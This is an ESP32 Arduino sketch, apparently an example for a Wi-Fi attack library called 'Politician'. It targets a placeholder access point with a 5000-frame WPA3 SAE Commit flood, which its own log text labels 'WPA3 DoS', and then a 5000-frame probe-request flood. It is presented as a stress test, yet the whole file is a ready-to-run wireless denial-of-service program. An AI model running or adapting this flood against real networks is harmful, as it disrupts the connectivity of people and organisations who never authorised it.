#include <Arduino.h>
#include "Politician.h"
#include "PoliticianStress.h"

using namespace politician;
using namespace politician::stress;

Politician engine;
const uint8_t TARGET_BSSID[6] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06 };

void setup() {
    Serial.begin(115200);
    delay(2000);

    Serial.println("[+] Booting Engine & Halting Hopper...");
    Config cfg;
    engine.begin(cfg);
    
    // Lock frequency
    engine.setTarget(TARGET_BSSID, 6);
    
    Serial.println("[+] Firing Massive SAE Commit Flood (WPA3 DoS) — 5000 frames...");
    uint32_t saeSent = saeCommitFlood(TARGET_BSSID, 5000);
    if (saeSent == 0) {
        Serial.println("[!] SAE Commit (0xB0) blocked by libnet80211.a sanity check (ESP_ERR_INVALID_ARG)");
    } else {
        Serial.printf("[+] Transmitted %lu SAE Commit frames\n", (unsigned long)saeSent);
    }

    Serial.println("[+] Firing Massive Probe Request Flood — 5000 frames...");
    uint32_t probeSent = probeRequestFlood(5000);
    if (probeSent == 0) {
        Serial.println("[!] Probe Request (0x40) blocked by libnet80211.a sanity check (ESP_ERR_INVALID_ARG)");
    } else {
        Serial.printf("[+] Transmitted %lu Probe Request frames\n", (unsigned long)probeSent);
    }

    Serial.println("[+] Stress Tests Complete.");
}

void loop() {
    delay(1000);
}
